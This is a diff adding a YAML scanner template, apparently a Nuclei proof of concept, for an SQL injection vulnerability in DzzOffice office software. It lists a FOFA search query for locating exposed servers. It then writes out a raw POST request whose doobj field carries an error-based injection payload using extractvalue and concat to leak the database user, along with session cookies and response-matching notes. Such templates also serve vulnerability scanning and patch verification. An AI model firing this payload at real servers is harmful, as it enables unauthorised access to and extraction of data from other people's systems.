@@ -1,0 +1,60 @@
+id: poc-cdwvfka5038gnux1
+info:
+  name: DzzOffice 办公软件 SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/cdwvfka5038gnux1'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: cdwvfka5038gnux1
+    fofa: FOFA：icon_hash="-1961736892" && body="立即注册"
+http:
+- raw:
+  - 'POST /index.php?mod=explorer&op=dynamic&do=filelist HTTP/1.1
+
+
+    Accept: */*
+
+
+    X-Requested-With: XMLHttpRequest
+
+
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+
+    Accept-Encoding: gzip, deflate, br
+
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+
+    Cookie: u8XY_2132_smile=1D1; u8XY_2132_explorer_index_isshow=show; u8XY_2132_saltkey=UHf5yZS6; u8XY_2132_lastvisit=1704245203; u8XY_2132_ulastactivity=edecqm1iSHNh8KZ5Pu4-47piNuG3efg-PmQo8qkR6iyN76ChohtT; u8XY_2132_auth=3efbjxVYEU2T8P1kjlZpGbjjbwe6HaaULHiIRCkGAp7P67tfPCEVE0cqh6jWbeOmcmq7PWhHl_vZQKw5anfp3A; u8XY_2132_sid=a3V4l7; u8XY_2132_sendmail=1; u8XY_2132_lastact=1704851450%09index.php%09explorer
+
+
+    Connection: close
+
+
+
+
+    doobj='' and extractvalue(1,concat(0x7e,user())) and ''1''=''1&doevent=&uids%5B%5D=1&startdate=&enddate=&disp=&asc=&page=0
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    ^(?=.*?(?:root|select)).*?$
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
